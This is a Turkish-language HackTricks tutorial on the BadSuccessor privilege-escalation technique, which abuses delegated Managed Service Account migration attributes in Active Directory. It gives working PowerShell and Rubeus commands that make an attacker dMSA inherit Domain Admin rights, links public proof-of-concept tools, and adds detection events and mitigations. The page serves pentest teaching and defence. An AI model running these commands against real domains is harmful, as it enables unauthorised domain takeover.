# BadSuccessor: Delegeli MSA Göç İstismarı ile Yetki Yükseltme

{{#include ../../banners/hacktricks-training.md}}

## Genel Bakış

Delegeli Yönetilen Hizmet Hesapları (**dMSA**), Windows Server 2025'te sunulan **gMSA**'nın bir sonraki nesil halefidir. Meşru bir göç iş akışı, yöneticilerin *eski* bir hesabı (kullanıcı, bilgisayar veya hizmet hesabı) dMSA ile değiştirirken izinleri şeffaf bir şekilde korumasına olanak tanır. İş akışı, `Start-ADServiceAccountMigration` ve `Complete-ADServiceAccountMigration` gibi PowerShell cmdlet'leri aracılığıyla açığa çıkar ve **dMSA nesnesinin** iki LDAP niteliğine dayanır:

* **`msDS-ManagedAccountPrecededByLink`** – *DN bağlantısı* ile geçersiz kılınan (eski) hesaba.
* **`msDS-DelegatedMSAState`**       – göç durumu (`0` = yok, `1` = devam ediyor, `2` = *tamamlandı*).

Eğer bir saldırgan, bir OU içinde **herhangi bir** dMSA oluşturabilir ve bu 2 niteliği doğrudan manipüle edebilirse, LSASS ve KDC dMSA'yı bağlı hesabın *halef* olarak kabul eder. Saldırgan daha sonra dMSA olarak kimlik doğruladığında **bağlı hesabın tüm ayrıcalıklarını devralır** – eğer Yönetici hesabı bağlıysa **Domain Admin**'e kadar.

Bu teknik, 2025'te Unit 42 tarafından **BadSuccessor** olarak adlandırılmıştır. Yazma anında **hiçbir güvenlik yaması** mevcut değildir; yalnızca OU izinlerinin güçlendirilmesi sorunu hafifletir.

### Saldırı Ön Koşulları

1. **Bir Organizasyonel Birim (OU)** içinde nesne oluşturmasına *izin verilen* bir hesap *ve* en az birine sahip olmalıdır:
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** nesne sınıfı
* `Create Child` → **`All Objects`** (genel oluşturma)
2. LDAP & Kerberos'a ağ bağlantısı (standart alan katılmış senaryo / uzaktan saldırı).

## Savunmasız OUs'u Belirleme

Unit 42, her OU'nun güvenlik tanımlarını ayrıştıran ve gerekli ACE'leri vurgulayan bir PowerShell yardımcı betiği yayınladı:
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
Arka planda, script `(objectClass=organizationalUnit)` için sayfalı bir LDAP araması yapar ve her `nTSecurityDescriptor`'ı kontrol eder:

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (nesne sınıfı *msDS-DelegatedManagedServiceAccount*)

## Sömürü Adımları

Yazılabilir bir OU belirlendikten sonra, saldırı sadece 3 LDAP yazım uzaklıktadır:
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Replikasyondan sonra, saldırgan basitçe `attacker_dMSA$` olarak **giriş yapabilir** veya bir Kerberos TGT talep edebilir – Windows, *geçersiz kılınmış* hesabın jetonunu oluşturacaktır.

### Otomasyon

Birçok kamuya açık PoC, şifre alma ve bilet yönetimi dahil olmak üzere tüm iş akışını sarmaktadır:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
* NetExec modülü – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

### Post-Exploitation
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Tespit ve Avlanma

OU'larda **Nesne Denetimi**'ni etkinleştirin ve aşağıdaki Windows Güvenlik Olaylarını izleyin:

* **5137** – **dMSA** nesnesinin oluşturulması
* **5136** – **`msDS-ManagedAccountPrecededByLink`**'in değiştirilmesi
* **4662** – Belirli nitelik değişiklikleri
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – dMSA için TGT verilmesi

`4662` (nitelik değişikliği), `4741` (bir bilgisayar/hizmet hesabının oluşturulması) ve `4624` (sonraki oturum açma) olaylarını ilişkilendirmek, BadSuccessor etkinliğini hızlı bir şekilde vurgular. **XSIAM** gibi XDR çözümleri, kullanıma hazır sorgularla birlikte gelir (referanslara bakın).

## Azaltma

* **En az ayrıcalık** ilkesini uygulayın – yalnızca *Hizmet Hesabı* yönetimini güvenilir rollere devredin.
* Açıkça gerekmeyen OU'lardan `Create Child` / `msDS-DelegatedManagedServiceAccount`'ı kaldırın.
* Yukarıda listelenen olay kimliklerini izleyin ve dMSA oluşturan veya düzenleyen *non-Tier-0* kimlikleri konusunda uyarı verin.

## Ayrıca bakınız

{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## Referanslar

- [Unit42 – İyi Hesaplar Kötüye Gitti: Delegeli Yönetilen Hizmet Hesaplarını Sömürmek](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [NetExec BadSuccessor modülü](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

{{#include ../../banners/hacktricks-training.md}}
